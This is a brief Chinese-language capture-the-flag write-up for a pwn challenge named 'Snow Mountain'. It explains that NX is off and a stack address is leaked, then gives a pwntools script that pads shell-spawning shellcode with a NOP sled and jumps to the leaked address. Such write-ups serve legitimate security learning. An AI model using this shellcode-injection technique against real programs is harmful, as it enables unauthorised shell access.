# Snow Mountain

这题关闭了NX保护，说明需要布置shellcode，难点在于找到shellcode位置。程序首先给出一个栈上的随机地址，并且栈上存在一个`0x1000`的字符数组。根据题目提示"滑雪"、"雪橇"等，容易想到利用nop sled滑到shellcode的位置来增加容错率。想到nop sled的话这题就做完了。

```py
ru('position: 0x')
cur = int(ru('\n'),16)
leak('cur',cur)
payload = asm(shellcraft.sh())
payload = payload.rjust(0x1000-1,'\x90')
sla('> ',payload)
sla('> ',hex(cur))
```